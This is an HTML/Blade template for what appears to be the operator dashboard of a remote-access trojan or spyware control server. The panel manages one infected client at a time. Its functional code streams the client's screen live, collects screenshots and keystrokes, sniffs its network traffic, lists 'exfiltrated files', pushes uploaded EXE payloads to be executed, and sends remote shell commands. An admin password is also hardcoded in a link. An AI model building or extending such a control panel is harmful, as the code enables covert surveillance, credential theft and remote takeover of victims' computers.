<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Client Management - {{ substr($clientId, 0, 12) }}</title>
    
    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
    
    <!-- Icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
    
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Chart.js -->
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>

    <style>
        :root {
            --bg-color: #0f172a;
            --sidebar-bg: rgba(30, 41, 59, 0.7);
            --card-bg: rgba(30, 41, 59, 0.6);
            --card-border: rgba(148, 163, 184, 0.1);
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --accent-color: #8b5cf6;
            --accent-hover: #7c3aed;
            --success-color: #10b981;
            --danger-color: #ef4444;
            --warning-color: #f59e0b;
        }

        body {
            background-color: var(--bg-color);
            background-image: 
                radial-gradient(at 0% 0%, rgba(139, 92, 246, 0.15) 0px, transparent 50%),
                radial-gradient(at 100% 0%, rgba(16, 185, 129, 0.15) 0px, transparent 50%);
            color: var(--text-primary);
            font-family: 'Outfit', sans-serif;
            min-height: 100vh;
        }

        /* Glassmorphism */
        .glass-panel {
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid var(--card-border);
            border-radius: 16px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }

        /* Navigation */
        .top-nav {
            background: rgba(15, 23, 42, 0.95);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid var(--card-border);
            padding: 1rem 0;
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .back-btn {
            background: transparent;
            border: 1px solid var(--card-border);
            color: var(--text-secondary);
            padding: 0.5rem 1rem;
            border-radius: 8px;
            text-decoration: none;
            transition: all 0.2s;
        }

        .back-btn:hover {
            background: var(--accent-color);
            color: white;
            border-color: var(--accent-color);
        }

        /* Status Badge */
        .badge-online {
            background: rgba(16, 185, 129, 0.2);
            color: #34d399;
            border: 1px solid rgba(16, 185, 129, 0.3);
            padding: 0.35em 0.65em;
            border-radius: 6px;
            font-size: 0.75em;
            font-weight: 600;
        }

        .badge-offline {
            background: rgba(239, 68, 68, 0.2);
            color: #f87171;
            border: 1px solid rgba(239, 68, 68, 0.3);
            padding: 0.35em 0.65em;
            border-radius: 6px;
            font-size: 0.75em;
            font-weight: 600;
        }

        /* Tabs */
        .nav-tabs {
            border-bottom: 1px solid var(--card-border);
            gap: 0.5rem;
        }

        .nav-tabs .nav-link {
            border: none;
            color: var(--text-secondary);
            padding: 0.75rem 1.5rem;
            border-radius: 8px 8px 0 0;
            transition: all 0.2s;
            background: transparent;
        }

        .nav-tabs .nav-link:hover {
            color: var(--accent-color);
            background: rgba(139, 92, 246, 0.1);
        }

        .nav-tabs .nav-link.active {
            color: white;
            background: var(--accent-color);
        }

        /* Live Player */
        .live-player {
            position: relative;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            aspect-ratio: 16/9;
            border: 1px solid var(--card-border);
        }

        .live-player img, .live-player video {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .player-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            padding: 1rem;
            background: linear-gradient(to bottom, rgba(0,0,0,0.7), transparent);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .live-badge {
            background: #ef4444;
            color: white;
            padding: 0.25rem 0.75rem;
            border-radius: 4px;
            font-size: 0.75rem;
            font-weight: 700;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }

        /* Gallery */
        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 1rem;
        }

        .gallery-item {
            position: relative;
            aspect-ratio: 16/9;
            background: #000;
            border-radius: 8px;
            overflow: hidden;
            cursor: pointer;
            transition: transform 0.2s;
        }

        .gallery-item:hover {
            transform: scale(1.05);
        }

        .gallery-item img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .gallery-item-overlay {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 0.5rem;
            background: rgba(0,0,0,0.7);
            font-size: 0.75rem;
        }

        /* Buttons */
        .btn-glow {
            background: var(--accent-color);
            color: white;
            border: none;
            box-shadow: 0 0 15px rgba(139, 92, 246, 0.4);
            transition: all 0.3s;
        }

        .btn-glow:hover {
            background: var(--accent-hover);
            box-shadow: 0 0 25px rgba(139, 92, 246, 0.6);
            color: white;
        }

        /* Network Sniffer */
        .sniffer-log {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            max-height: 500px;
            overflow-y: auto;
            padding: 1rem;
            border-radius: 8px;
        }

        .packet-entry {
            margin-bottom: 0.25rem;
            line-height: 1.4;
        }

        .packet-protocol-tcp { color: #3b82f6; }
        .packet-protocol-udp { color: #10b981; }
        .packet-protocol-http { color: #f59e0b; }
        .packet-protocol-https { color: #ef4444; }
        .packet-protocol-dns { color: #8b5cf6; }

        /* File Upload */
        .upload-zone {
            border: 2px dashed var(--card-border);
            border-radius: 12px;
            padding: 2rem;
            text-align: center;
            transition: all 0.2s;
            cursor: pointer;
        }

        .upload-zone.drag-over {
            border-color: var(--accent-color);
            background: rgba(139, 92, 246, 0.1);
        }

        .progress {
            background-color: rgba(255, 255, 255, 0.1);
        }

        .progress-bar {
            background-color: var(--accent-color);
        }

        /* Stats Cards */
        .stat-mini {
            background: rgba(255, 255, 255, 0.05);
            padding: 1rem;
            border-radius: 8px;
            border: 1px solid var(--card-border);
        }

        .stat-mini-value {
            font-size: 1.5rem;
            font-weight: 700;
        }

        .stat-mini-label {
            font-size: 0.75rem;
            color: var(--text-secondary);
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    <!-- Top Navigation -->
    <nav class="top-nav">
        <div class="container-fluid px-4">
            <div class="d-flex justify-content-between align-items-center">
                <div class="d-flex align-items-center gap-3">
                    <a href="/admin/dashboard?password=54321" class="back-btn">
                        <i class="bi bi-arrow-left me-2"></i>Back to Overview
                    </a>
                    <div class="vr"></div>
                    <h5 class="m-0 text-white">
                        <i class="bi bi-cpu-fill me-2" style="color: var(--accent-color)"></i>
                        Client: <span id="clientIdDisplay">{{ substr($clientId, 0, 12) }}...</span>
                    </h5>
                </div>
                <div class="d-flex align-items-center gap-3">
                    <span id="statusBadge" class="badge-offline">Offline</span>
                    <span class="badge bg-dark border border-secondary">
                        <i class="bi bi-clock me-1"></i>
                        <span id="lastSeen">--</span>
                    </span>
                </div>
            </div>
        </div>
    </nav>

    <div class="container-fluid px-4 py-4">
        <!-- Quick Stats -->
        <div class="row g-3 mb-4" id="quickStats">
            <div class="col-md-3">
                <div class="stat-mini">
                    <div class="stat-mini-value" id="statUptime">--</div>
                    <div class="stat-mini-label">Session Uptime</div>
                </div>
            </div>
            <div class="col-md-3">
                <div class="stat-mini">
                    <div class="stat-mini-value" id="statKeylogs">0</div>
                    <div class="stat-mini-label">Keylogs Captured</div>
                </div>
            </div>
            <div class="col-md-3">
                <div class="stat-mini">
                    <div class="stat-mini-value" id="statScreenshots">0</div>
                    <div class="stat-mini-label">Screenshots</div>
                </div>
            </div>
            <div class="col-md-3">
                <div class="stat-mini">
                    <div class="stat-mini-value" id="statPackets">0</div>
                    <div class="stat-mini-label">Network Packets</div>
                </div>
            </div>
        </div>

        <!-- Tab Navigation -->
        <ul class="nav nav-tabs mb-4" id="clientTabs" role="tablist">
            <li class="nav-item">
                <button class="nav-link active" data-bs-toggle="tab" data-bs-target="#tab-overview" type="button">
                    <i class="bi bi-grid me-2"></i>Overview
                </button>
            </li>
            <li class="nav-item">
                <button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-live" type="button">
                    <i class="bi bi-camera-video me-2"></i>Live Stream
                </button>
            </li>
            <li class="nav-item">
                <button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-gallery" type="button">
                    <i class="bi bi-images me-2"></i>Gallery
                </button>
            </li>
            <li class="nav-item">
                <button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-keylogs" type="button">
                    <i class="bi bi-keyboard me-2"></i>Keylogs
                </button>
            </li>
            <li class="nav-item">
                <button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-sniffer" type="button">
                    <i class="bi bi-activity me-2"></i>Network
                </button>
            </li>
            <li class="nav-item">
                <button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-files" type="button">
                    <i class="bi bi-folder me-2"></i>Files
                </button>
            </li>
            <li class="nav-item">
                <button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-shell" type="button">
                    <i class="bi bi-terminal me-2"></i>Shell
                </button>
            </li>
            <li class="nav-item">
                <button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-info" type="button">
                    <i class="bi bi-info-circle me-2"></i>Info
                </button>
            </li>
        </ul>

        <!-- Tab Content -->
        <div class="tab-content" id="clientTabsContent">
            <!-- Overview Tab -->
            <div class="tab-pane fade show active" id="tab-overview">
                <div class="row g-4">
                    <div class="col-lg-8">
                        <div class="glass-panel p-4 mb-4">
                            <h6 class="text-white mb-3">System Information</h6>
                            <div class="row g-3" id="systemInfo">
                                <div class="col-md-6">
                                    <small class="text-secondary">Operating System</small>
                                    <p class="mb-0 text-white" id="infoOS">--</p>
                                </div>
                                <div class="col-md-6">
                                    <small class="text-secondary">Architecture</small>
                                    <p class="mb-0 text-white" id="infoArch">--</p>
                                </div>
                                <div class="col-md-6">
                                    <small class="text-secondary">Hostname</small>
                                    <p class="mb-0 text-white" id="infoHostname">--</p>
                                </div>
                                <div class="col-md-6">
                                    <small class="text-secondary">Username</small>
                                    <p class="mb-0 text-white" id="infoUsername">--</p>
                                </div>
                                <div class="col-md-6">
                                    <small class="text-secondary">IP Address</small>
                                    <p class="mb-0 text-white" id="infoIP">--</p>
                                </div>
                                <div class="col-md-6">
                                    <small class="text-secondary">MAC Address</small>
                                    <p class="mb-0 text-white font-monospace" id=" infoMAC">--</p>
                                </div>
                            </div>
                        </div>
                        
                        <div class="glass-panel p-4">
                            <h6 class="text-white mb-3">Activity Timeline</h6>
                            <canvas id="activityChart" height="100"></canvas>
                        </div>
                    </div>
                    
                    <div class="col-lg-4">
                        <div class="glass-panel p-4 mb-4">
                            <h6 class="text-white mb-3">Data Collection</h6>
                            <canvas id="dataChart" height="200"></canvas>
                        </div>
                        
                        <div class="glass-panel p-4">
                            <h6 class="text-white mb-3">Quick Actions</h6>
                            <div class="d-grid gap-2">
                                <button class="btn btn-sm btn-glow" onclick="requestScreenshot()">
                                    <i class="bi bi-camera me-2"></i>Capture Screenshot
                                </button>
                                <button class="btn btn-sm btn-outline-info" onclick="startLiveStream()">
                                    <i class="bi bi-play-circle me-2"></i>Start Live Stream
                                </button>
                                <button class="btn btn-sm btn-outline-warning" onclick="flushTelemetry()">
                                    <i class="bi bi-download me-2"></i>Flush Telemetry
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Live Stream Tab -->
            <div class="tab-pane fade" id="tab-live">
                <div class="glass-panel p-4">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h6 class="text-white m-0">Real-Time Stream</h6>
                        <div class="btn-group">
                            <button class="btn btn-sm btn-success" onclick="startLiveStream()">
                                <i class="bi bi-play-fill me-1"></i>Start
                            </button>
                            <button class="btn btn-sm btn-danger" onclick="stopLiveStream()">
                                <i class="bi bi-stop-fill me-1"></i>Stop
                            </button>
                            <select class="form-select form-select-sm bg-dark border-secondary text-white" id="streamQuality" style="width: 120px;">
                                <option value="500">Low (500ms)</option>
                                <option value="1000" selected>Medium (1s)</option>
                                <option value="2000">High (2s)</option>
                            </select>
                        </div>
                    </div>
                    
                    <div class="live-player" id="livePlayer">
                        <div class="player-overlay" id="playerOverlay" style="display:none;">
                            <span class="live-badge">LIVE</span>
                            <span class="badge bg-dark">
                                <i class="bi bi-reception-4 me-1"></i>
                                <span id="streamFps">--</span> FPS
                            </span>
                        </div>
                        <img id="streamImage" src="" alt="Stream" style="display:none;">
                        <div id="streamPlaceholder" class="d-flex align-items-center justify-content-center h-100">
                            <div class="text-center text-secondary">
                                <i class="bi bi-play-circle fs-1"></i>
                                <p class="mt-2">Click Start to begin streaming</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Gallery Tab -->
            <div class="tab-pane fade" id="tab-gallery">
                <div class="glass-panel p-4">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h6 class="text-white m-0">Screenshot Gallery</h6>
                        <div class="btn-group">
                            <button class="btn btn-sm btn-outline-primary" onclick="loadGallery()">
                                <i class="bi bi-arrow-clockwise me-1"></i>Refresh
                            </button>
                            <button class="btn btn-sm btn-outline-success" onclick="downloadAllScreenshots()">
                                <i class="bi bi-download me-1"></i>Download All
                            </button>
                        </div>
                    </div>
                    
                    <div class="gallery-grid" id="galleryGrid">
                        <div class="text-center text-secondary py-5 col-12">
                            <i class="bi bi-images fs-1"></i>
                            <p class="mt-2">No screenshots available</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Keylogs Tab -->
            <div class="tab-pane fade" id="tab-keylogs">
                <div class="glass-panel p-4">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h6 class="text-white m-0">Captured Keystrokes</h6>
                        <div class="btn-group">
                            <input type="search" class="form-control form-control-sm bg-dark border-secondary text-white" 
                                   id="keylogSearch" placeholder="Search keylogs..." style="width: 200px;">
                            <button class="btn btn-sm btn-outline-success" onclick="exportKeylogs()">
                                <i class="bi bi-download me-1"></i>Export
                            </button>
                        </div>
                    </div>
                    
                    <div class="bg-black p-3 rounded" style="max-height: 600px; overflow-y: auto;">
                        <pre id="keylogContent" class="text-success m-0" style="font-size: 0.9rem;">Loading keylogs...</pre>
                    </div>
                </div>
            </div>

            <!-- Network Sniffer Tab -->
            <div class="tab-pane fade" id="tab-sniffer">
                <div class="glass-panel p-4">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h6 class="text-white m-0">Network Traffic Monitor</h6>
                        <div class="btn-group">
                            <button class="btn btn-sm btn-success" onclick="sendCommand('sniffer_control', 'start')">
                                <i class="bi bi-play-fill me-1"></i>Start
                            </button>
                            <button class="btn btn-sm btn-danger" onclick="sendCommand('sniffer_control', 'stop')">
                                <i class="bi bi-stop-fill me-1"></i>Stop
                            </button>
                            <button class="btn btn-sm btn-outline-info" onclick="loadSnifferLogs()">
                                <i class="bi bi-arrow-clockwise me-1"></i>Refresh
                            </button>
                            <select class="form-select form-select-sm bg-dark border-secondary text-white" id="protocolFilter" 
                                    onchange="filterPackets()" style="width: 120px;">
                                <option value="">All Protocols</option>
                                <option value="TCP">TCP</option>
                                <option value="UDP">UDP</option>
                                <option value="HTTP">HTTP</option>
                                <option value="HTTPS">HTTPS</option>
                                <option value="DNS">DNS</option>
                            </select>
                        </div>
                    </div>
                    
                    <div class="sniffer-log" id="snifferLog">
                        <div class="text-secondary">Select 'Refresh' to load captured packets...</div>
                    </div>
                </div>
            </div>

            <!-- Files Tab -->
            <div class="tab-pane fade" id="tab-files">
                <div class="row g-4">
                    <div class="col-lg-6">
                        <div class="glass-panel p-4">
                            <h6 class="text-white mb-3">Upload File to Client</h6>
                            <div class="upload-zone" id="uploadZone" onclick="document.getElementById('fileInput').click()">
                                <i class="bi bi-cloud-upload fs-1 text-secondary"></i>
                                <p class="mt-2 text-secondary">Click or drag files here</p>
                                <small class="text-secondary">ZIP files will be extracted automatically. EXE files will be executed.</small>
                                <input type="file" id="fileInput" style="display:none;" onchange="uploadFile(this)">
                            </div>
                            <div id="uploadProgress" class="mt-3" style="display:none;">
                                <div class="progress">
                                    <div class="progress-bar" role="progressbar" style="width: 0%"></div>
                                </div>
                                <small class="text-secondary mt-1 d-block" id="uploadStatus">Uploading...</small>
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-lg-6">
                        <div class="glass-panel p-4">
                            <h6 class="text-white mb-3">Exfiltrated Files</h6>
                            <div class="table-responsive" style="max-height: 400px; overflow-y: auto;">
                                <table class="table table-dark table-sm table-hover">
                                    <thead>
                                        <tr>
                                            <th>Filename</th>
                                            <th>Size</th>
                                            <th>Date</th>
                                            <th>Action</th>
                                        </tr>
                                    </thead>
                                    <tbody id="filesList">
                                        <tr>
                                            <td colspan="4" class="text-center text-secondary">Loading...</td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Shell Tab -->
            <div class="tab-pane fade" id="tab-shell">
                <div class="glass-panel p-4">
                    <h6 class="text-white mb-3">Remote Shell</h6>
                    <div class="bg-black p-3 rounded mb-3 font-monospace text-success" id="shellOutput" 
                         style="height: 400px; overflow-y: auto; font-size: 0.85rem;">
                        > Ready for commands...
                    </div>
                    <div class="input-group">
                        <span class="input-group-text bg-dark border-secondary text-success font-monospace">$</span>
                        <input type="text" class="form-control bg-dark border-secondary text-white font-monospace" 
                               id="shellInput" placeholder="Enter command..." onkeypress="if(event.key==='Enter')executeShellCommand()">
                        <button class="btn btn-primary" onclick="executeShellCommand()">
                            <i class="bi bi-arrow-right-circle me-1"></i>Execute
                        </button>
                    </div>
                </div>
            </div>

            <!-- Info Tab -->
            <div class="tab-pane fade" id="tab-info">
                <div class="glass-panel p-4">
                    <h6 class="text-white mb-3">Detailed Information</h6>
                    <div id="detailedInfo" class="text-secondary">
                        Loading detailed information...
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Scripts -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        const clientId = '{{ $clientId }}';
        let streamInterval = null;
        let lastStreamUpdate = null;
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            loadClientData();
            setupAutoRefresh();
            loadGallery();
            loadFiles();
        });
        
        function loadClientData() {
            // Load client details
            fetch('/admin/terminal-details?id=' + clientId)
                .then(r => r.json())
                .then(data => {
                    if(data.status === 'success' && data.terminal) {
                        updateClientInfo(data.terminal);
                    }
                });
        }
        
        function updateClientInfo(terminal) {
            document.getElementById('infoOS').textContent = terminal.os || '--';
            document.getElementById('infoArch').textContent = terminal.arch || '--';
            document.getElementById('infoHostname').textContent = terminal.hostname || '--';
            document.getElementById('infoUsername').textContent = terminal.username || '--';
            document.getElementById('infoIP').textContent = terminal.ip || '--';
            document.getElementById('infoMAC').textContent = terminal.mac_address || '--';
            
            // Update status
            let lastSeen = terminal.last_seen ? new Date(terminal.last_seen * 1000) : null;
            if(lastSeen) {
                let diff = Math.floor((Date.now() - lastSeen) / 1000);
                let isOnline = diff < 60;
                
                document.getElementById('statusBadge').className = isOnline ? 'badge-online' : 'badge-offline';
                document.getElementById('statusBadge').innerHTML = isOnline ? '<i class="bi bi-circle-fill me-1" style="font-size:0.6em"></i> Online' : 'Offline';
                document.getElementById('lastSeen').textContent = formatTimeSince(diff);
            }
        }
        
        function formatTimeSince(seconds) {
            if(seconds < 0) return 'Just now';
            if(seconds < 60) return seconds + 's ago';
            if(seconds < 3600) return Math.floor(seconds/60) + 'm ago';
            if(seconds < 86400) return Math.floor(seconds/3600) + 'h ago';
            return Math.floor(seconds/86400) + 'd ago';
        }
        
        function setupAutoRefresh() {
            setInterval(loadClientData, 10000); // Refresh every 10s
        }
        
        function startLiveStream() {
            let quality = document.getElementById('streamQuality').value;
            sendCommand('screen_capture_start', quality);
            
            streamInterval = setInterval(() => {
                let streamImg = document.getElementById('streamImage');
                streamImg.src = '/api/livefeed/' + clientId + '?t=' + Date.now();
                streamImg.style.display = 'block';
                document.getElementById('streamPlaceholder').style.display = 'none';
                document.getElementById('playerOverlay').style.display = 'flex';
                
                // Calculate FPS
                if(lastStreamUpdate) {
                    let fps = Math.round(1000 / (Date.now() - lastStreamUpdate));
                    document.getElementById('streamFps').textContent = fps;
                }
                lastStreamUpdate = Date.now();
            }, parseInt(quality));
        }
        
        function stopLiveStream() {
            sendCommand('screen_capture_stop');
            if(streamInterval) {
                clearInterval(streamInterval);
                streamInterval = null;
            }
            document.getElementById('streamImage').style.display = 'none';
            document.getElementById('streamPlaceholder').style.display = 'flex';
            document.getElementById('playerOverlay').style.display = 'none';
        }
        
        function loadGallery() {
            fetch('/api/screenshots/' + clientId + '?per_page=50')
                .then(r => r.json())
                .then(data => {
                    let grid = document.getElementById('galleryGrid');
                    if(data.screenshots && data.screenshots.length > 0) {
                        grid.innerHTML = '';
                        data.screenshots.forEach(screenshot => {
                            grid.innerHTML += `
                                <div class="gallery-item" onclick="window.open('${screenshot.url}', '_blank')">
                                    <img src="${screenshot.url}" alt="Screenshot">
                                    <div class="gallery-item-overlay">
                                        ${new Date(screenshot.time * 1000).toLocaleString()}
                                    </div>
                                </div>
                            `;
                        });
                    } else {
                        grid.innerHTML = '<div class="text-center text-secondary py-5 col-12"><i class="bi bi-images fs-1"></i><p class="mt-2">No screenshots available</p></div>';
                    }
                });
        }
        
        function loadFiles() {
            fetch('/admin/files/' + clientId)
                .then(r => r.json())
                .then(files => {
                    let tbody = document.getElementById('filesList');
                    if(files && files.length > 0) {
                        tbody.innerHTML = '';
                        files.forEach(file => {
                            tbody.innerHTML += `
                                <tr>
                                    <td>${file.name}</td>
                                    <td>${formatBytes(file.size)}</td>
                                    <td>${new Date(file.time * 1000).toLocaleString()}</td>
                                    <td>
                                        <a href="/admin/files/${clientId}/${file.name}" class="btn btn-sm btn-outline-primary">
                                            <i class="bi bi-download"></i>
                                        </a>
                                    </td>
                                </tr>
                            `;
                        });
                    } else {
                        tbody.innerHTML = '<tr><td colspan="4" class="text-center text-secondary">No files</td></tr>';
                    }
                });
        }
        
        function formatBytes(bytes) {
            if (bytes < 1024) return bytes + ' B';
            else if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
            else return (bytes / 1048576).toFixed(1) + ' MB';
        }
        
        function sendCommand(type, command) {
            fetch('/admin/command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify({
                    terminal_id: clientId,
                    command: command,
                    type: type
                })
            })
            .then(r => r.json())
            .then(data => {
                console.log('Command sent:', data);
            });
        }
        
        function executeShellCommand() {
            let input = document.getElementById('shellInput');
            let cmd = input.value.trim();
            if(!cmd) return;
            
            let output = document.getElementById('shellOutput');
            output.innerHTML += `\n<span class="text-secondary">$</span> ${cmd}`;
            
            sendCommand('shell', cmd);
            input.value = '';
            
            // Scroll to bottom
            output.scrollTop = output.scrollHeight;
        }
        
        async function uploadFile(input) {
            let file = input.files[0];
            if(!file) return;
            
            let formData = new FormData();
            formData.append('file', file);
            formData.append('terminal_id', clientId);
            
            let progress = document.getElementById('uploadProgress');
            progress.style.display = 'block';
            
            try {
                let response = await fetch('/admin/upload-payload', {
                    method: 'POST',
                    headers: {
                        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                    },
                    body: formData
                });
                
                let data = await response.json();
                document.getElementById('uploadStatus').textContent = data.message || 'Upload complete!';
                setTimeout(() => { progress.style.display = 'none'; }, 3000);
            } catch(e) {
                document.getElementById('uploadStatus').textContent = 'Upload failed';
            }
        }
        
        function requestScreenshot() {
            sendCommand('screenshot', '');
            alert('Screenshot requested. Check gallery in a few moments.');
        }
        
        function flushTelemetry() {
            sendCommand('flush_telemetry', '');
            alert('Telemetry flush requested.');
        }
        
        // Drag and drop
        let uploadZone = document.getElementById('uploadZone');
        uploadZone.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadZone.classList.add('drag-over');
        });
        uploadZone.addEventListener('dragleave', () => {
            uploadZone.classList.remove('drag-over');
        });
        uploadZone.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadZone.classList.remove('drag-over');
            if(e.dataTransfer.files.length > 0) {
                document.getElementById('fileInput').files = e.dataTransfer.files;
                uploadFile(document.getElementById('fileInput'));
            }
        });
    </script>
</body>
</html>
